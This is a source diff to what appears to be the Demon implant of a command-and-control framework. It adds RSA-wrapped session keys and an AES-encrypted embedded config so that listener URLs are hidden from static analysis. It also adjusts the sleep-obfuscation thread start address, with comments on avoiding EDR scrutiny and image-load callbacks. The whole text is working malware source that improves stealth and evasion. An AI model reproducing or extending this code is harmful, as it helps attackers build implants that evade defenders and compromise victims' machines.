@@ -18,8 +18,18 @@
 /* Import Inject Headers */
 #include <core/ObjectApi.h>
 
+/* [HVC-005 2026-03-28] RSA-2048-OAEP-SHA256 key wrapping for registration. */
+#include <crypt/RsaCrypt.h>
+
+/* [HVC-014 2026-04-28] AES-256-CTR for encrypted CONFIG_BYTES embedding. */
+#include <crypt/AesCrypt.h>
+
 /* Global Variables */
 SEC_DATA PINSTANCE Instance      = { 0 };
+/* [HVC-014 2026-04-28] AgentConfig holds AES-256-CTR ciphertext at startup;
+ * decrypted in-place at the top of DemonConfig() before parsing. The bytes
+ * here look like random data to xxd / strings — listener URLs, headers,
+ * user-agent, pivot pipe names are NOT visible in the binary. */
 SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
 
 /*
@@ -156,9 +166,39 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
     */
 
-    // Add AES Keys/IV
-    PackageAddPad( *MetaData, ( PCHAR ) Instance->Config.AES.Key, 32 );
-    PackageAddPad( *MetaData, ( PCHAR ) Instance->Config.AES.IV,  16 );
+    /*
+     * [HVC-005 2026-03-28] Wrap the 48-byte AES session key material with the
+     * teamserver's RSA-2048 public key using OAEP-SHA256.  SERVER_PUBKEY_BLOB
+     * is injected by the builder as a BCRYPT_RSAPUBLIC_BLOB byte array (283
+     * bytes).  The resulting 256-byte ciphertext replaces the former plaintext
+     * AES key / IV transmission.  The teamserver decrypts with its private key
+     * to recover the session keys.  See TrafficImprovements.md §5.
+     */
+    {
+        UCHAR  KeyMaterial[ 48 ]           = { 0 };
+        UCHAR  RsaCipherText[ RSA_CIPHERTEXT_LEN ] = { 0 };
+        UCHAR  PubKeyBlob[]                = SERVER_PUBKEY_BLOB;
+
+        /* Pack key material: 32-byte key then 16-byte IV */
+        MemCopy( KeyMaterial,      Instance->Config.AES.Key, 32 );
+        MemCopy( KeyMaterial + 32, Instance->Config.AES.IV,  16 );
+
+        if ( RsaOaepEncrypt(
+                PubKeyBlob,  RSA_PUBKEY_BLOB_LEN,
+                KeyMaterial, sizeof( KeyMaterial ),
+                RsaCipherText ) )
+        {
+            PackageAddPad( *MetaData, ( PCHAR ) RsaCipherText, RSA_CIPHERTEXT_LEN );
+        }
+        else
+        {
+            /* Encryption failed — abort registration to avoid key exposure. */
+            return;
+        }
+
+        MemZero( KeyMaterial,  sizeof( KeyMaterial  ) );
+        MemZero( RsaCipherText, sizeof( RsaCipherText ) );
+    }
 
     // Add session id
     PackageAddInt32( *MetaData, Instance->Session.AgentID );
@@ -250,7 +290,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 
     MemSet( &OsVersions, 0, sizeof( OsVersions ) );
     OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
-    Instance->Win32.RtlGetVersion( &OsVersions );
+    Instance->Win32.RtlGetVersion( (PRTL_OSVERSIONINFOW) &OsVersions );
     PackageAddInt32( *MetaData, OsVersions.dwMajorVersion    );
     PackageAddInt32( *MetaData, OsVersions.dwMinorVersion    );
     PackageAddInt32( *MetaData, OsVersions.wProductType      );
@@ -284,6 +324,10 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 #endif
     };
 
+    PUTS( "============================================================" )
+    PUTS( "===== DemonInit START =====" )
+    PUTS( "============================================================" )
+
     Instance->Teb = NtCurrentTeb();
 
 #ifdef TRANSPORT_HTTP
@@ -314,11 +358,18 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.RtlCreateTimer                    = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLCREATETIMER );
         Instance->Win32.RtlQueueWorkItem                  = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLQUEUEWORKITEM );
         Instance->Win32.RtlRegisterWait                   = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLREGISTERWAIT );
+        Instance->Win32.RtlDeregisterWaitEx               = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLDEREGISTERWAITEX );
         Instance->Win32.RtlDeleteTimerQueue               = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLDELETETIMERQUEUE );
+        Instance->Win32.RtlDeleteTimerQueueEx             = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLDELETETIMERQUEUEEX );
         Instance->Win32.RtlCaptureContext                 = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLCAPTURECONTEXT );
         Instance->Win32.RtlAddVectoredExceptionHandler    = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER );
         Instance->Win32.RtlRemoveVectoredExceptionHandler = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
         Instance->Win32.RtlCopyMappedMemory               = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLCOPYMAPPEDMEMORY );
+
+        /* [HVC-007 2026-03-28] LZNT1 compression functions from ntdll.dll. */
+        Instance->Win32.RtlGetCompressionWorkSpaceSize     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLGETCOMPRESSIONWORKSPACESIZE );
+        Instance->Win32.RtlCompressBuffer                  = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLCOMPRESSBUFFER );
+        Instance->Win32.RtlDecompressBuffer                = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLDECOMPRESSBUFFER );
 
         /* Native functions */
         Instance->Win32.NtClose                           = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTCLOSE );
@@ -368,7 +419,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     /* resolve Windows version */
     Instance->Session.OSVersion = WIN_VERSION_UNKNOWN;
     OSVersionExW.dwOSVersionInfoSize = sizeof( OSVersionExW );
-    if ( NT_SUCCESS( Instance->Win32.RtlGetVersion( &OSVersionExW ) ) ) {
+    if ( NT_SUCCESS( Instance->Win32.RtlGetVersion( (PRTL_OSVERSIONINFOW) &OSVersionExW ) ) ) {
         if ( OSVersionExW.dwMajorVersion >= 5 ) {
             if ( OSVersionExW.dwMajorVersion == 5 ) {
                 if ( OSVersionExW.dwMinorVersion == 1 ) {
@@ -411,8 +462,10 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.GetFileSize                     = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETFILESIZE );
         Instance->Win32.GetFileSizeEx                   = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETFILESIZEEX );
         Instance->Win32.CreateNamedPipeW                = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_CREATENAMEDPIPEW );
+#ifdef SLEEPOBF_USE_FOLIAGE
         Instance->Win32.ConvertFiberToThread            = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_CONVERTFIBERTOTHREAD );
         Instance->Win32.CreateFiberEx                   = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_CREATEFIBEREX );
+#endif
         Instance->Win32.ReadFile                        = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_READFILE );
         Instance->Win32.VirtualAllocEx                  = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_VIRTUALALLOCEX );
         Instance->Win32.WaitForSingleObjectEx           = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_WAITFORSINGLEOBJECTEX );
@@ -420,9 +473,11 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.GetExitCodeProcess              = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETEXITCODEPROCESS );
         Instance->Win32.GetExitCodeThread               = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETEXITCODETHREAD );
         Instance->Win32.TerminateProcess                = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_TERMINATEPROCESS );
+#ifdef SLEEPOBF_USE_FOLIAGE
         Instance->Win32.ConvertThreadToFiberEx          = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_CONVERTTHREADTOFIBEREX );
         Instance->Win32.SwitchToFiber                   = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_SWITCHTOFIBER );
         Instance->Win32.DeleteFiber                     = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_DELETEFIBER );
+#endif
         Instance->Win32.AllocConsole                    = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_ALLOCCONSOLE );
         Instance->Win32.FreeConsole                     = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_FREECONSOLE );
         Instance->Win32.GetConsoleWindow                = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETCONSOLEWINDOW );
@@ -568,6 +623,10 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     }
 
     PRINTF( "Instance DemonID => %x\n", Instance->Session.AgentID )
+
+    PUTS( "============================================================" )
+    PUTS( "===== DemonInit COMPLETE =====" )
+    PUTS( "============================================================" )
 }
 
 VOID DemonConfig()
@@ -579,6 +638,26 @@ VOID DemonConfig()
     DWORD  J      = 0;
 
     PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
+
+    /* [HVC-014 2026-04-28] Decrypt the embedded config in-place before parsing.
+     * The CONFIG_KEY and CONFIG_IV macros expand to byte-array initializers
+     * generated freshly by builder.go for this build. Plaintext listener URLs,
+     * headers, user-agent etc. were never present in the binary file — only
+     * AES-256-CTR ciphertext was. After this block the parser sees plaintext.
+     * Local key material is wiped immediately after the in-place decrypt. */
+    {
+        AESCTX CfgAes        = { 0 };
+        BYTE   CfgKey[ 32 ]  = CONFIG_KEY;
+        BYTE   CfgIv [ 16 ]  = CONFIG_IV;
+
+        AesInit( &CfgAes, CfgKey, CfgIv );
+        AesXCryptBuffer( &CfgAes, ( PUINT8 ) AgentConfig, sizeof( AgentConfig ) );
+
+        RtlSecureZeroMemory( CfgKey,  sizeof( CfgKey ) );
+        RtlSecureZeroMemory( CfgIv,   sizeof( CfgIv  ) );
+        RtlSecureZeroMemory( &CfgAes, sizeof( CfgAes ) );
+        PUTS( "[HVC-014] config decrypted in-place" )
+    }
 
     ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
     RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );
@@ -783,7 +862,25 @@ VOID DemonConfig()
     Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
 #endif
 
-    Instance->Config.Implant.ThreadStartAddr = Instance->Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
+    /* Start address for the Foliage sleep-obfuscation APC thread.
+     *
+     * The thread is created suspended and its context is completely
+     * overwritten by NtContinue before it ever runs, so strictly speaking
+     * the start address is never executed. However the OS validates the
+     * address at thread creation and some EDRs inspect it for image-load
+     * callbacks, so it MUST point at a real, stable, executable entry.
+     *
+     * The previous default — `LdrLoadDll + 0x12` — was a brittle magic
+     * offset meant to skip the hooked prologue; the layout was refactored
+     * on Windows 11 23H2+ and the offset no longer lands at an instruction
+     * boundary, causing occasional crashes on the fallback path where the
+     * thread actually executes the start address.
+     *
+     * NtTestAlert is tiny, alertable, exported by ntdll on every supported
+     * Windows version, and produces no image-load callback. Resolve via the
+     * already-populated function table.
+     * See BUG-FOL-3 in SleepObf-Analysis.md §8. */
+    Instance->Config.Implant.ThreadStartAddr = Instance->Win32.NtTestAlert;
     Instance->Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;
 
     ParserDestroy( &Parser );
